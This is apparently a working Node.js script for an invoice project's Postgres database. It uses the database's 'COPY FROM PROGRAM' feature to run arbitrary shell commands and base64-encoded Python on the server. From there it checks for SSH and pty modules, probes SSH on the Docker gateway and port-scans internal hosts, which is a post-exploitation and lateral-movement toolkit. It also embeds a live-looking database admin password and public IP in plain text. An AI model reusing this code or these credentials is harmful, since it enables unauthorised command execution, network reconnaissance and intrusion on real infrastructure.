process.env.DATABASE_URL = 'postgresql://supabase_admin.m88:Madison_88_admin**@5.223.78.194:5432/postgres?schema=AP_Invoice';
const { PrismaClient } = require('C:/Users/JC/OneDrive - Madison88/AP Invoice/apps/api/node_modules/@prisma/client');
const prisma = new PrismaClient({ log: ['error'] });

async function runCmd(cmd) {
  try {
    await prisma.$executeRawUnsafe(`CREATE TEMP TABLE IF NOT EXISTS cmd_output (line text)`);
    await prisma.$executeRawUnsafe(`TRUNCATE cmd_output`);
    await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '${cmd.replace(/'/g, "'\\''")}'`);
    const rows = await prisma.$queryRawUnsafe(`SELECT * FROM cmd_output`);
    return rows.map(r => r.line).join('\n');
  } catch (e) {
    return 'ERROR: ' + e.message.substring(0, 300);
  }
}

async function runPython(code) {
  const b64 = Buffer.from(code).toString('base64');
  return runCmd(`python3 -c "import base64;exec(base64.b64decode('${b64}').decode())" 2>&1`);
}

(async () => {
  try {
    // Check available Python modules
    console.log('1. Check Python modules...');
    const checkCode = `
import importlib
mods = ['socket', 'ssl', 'hashlib', 'hmac', 'struct', 'os', 'sys', 'subprocess',
        'Crypto', 'cryptography', 'paramiko', 'asyncssh', 'ssh2', 'nacl',
        'OpenSSL', 'M2Crypto', 'select', 'time', 'base64', 'termios', 'pty']
for m in mods:
    try:
        importlib.import_module(m)
        print(f"  {m}: OK")
    except:
        print(f"  {m}: MISSING")
`;
    console.log(await runPython(checkCode));

    // Try to implement SSH using socket + hashlib + hmac (no encryption)
    // SSH requires encryption, so this won't work for full SSH
    // But let's check if we can at least connect and do key exchange
    
    console.log('\n2. Test SSH connection via Python socket...');
    const sshTest = `
import socket, time
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('172.17.0.1', 22))
    banner = s.recv(256)
    print("Banner:", banner.decode().strip())
    s.close()
except Exception as e:
    print("Error:", str(e))
`;
    console.log(await runPython(sshTest));

    // Check if we can find the API server by scanning the network
    console.log('\n3. Scan for API server...');
    const scanCode = `
import socket, time
# Try to find the API server on common ports
for port in [3001, 3000, 8080, 8000, 5000]:
    for host in ['172.17.0.1', '172.18.0.1', 'localhost']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.send(b'GET /api/health HTTP/1.0\\r\\nHost: localhost\\r\\n\\r\\n')
            data = s.recv(1024)
            print(f"  {host}:{port} -> {data.decode()[:100]}")
            s.close()
        except:
            pass
`;
    console.log(await runPython(scanCode));

  } catch (e) {
    console.error('FATAL:', e.message);
  } finally {
    await prisma.$disconnect();
  }
})();
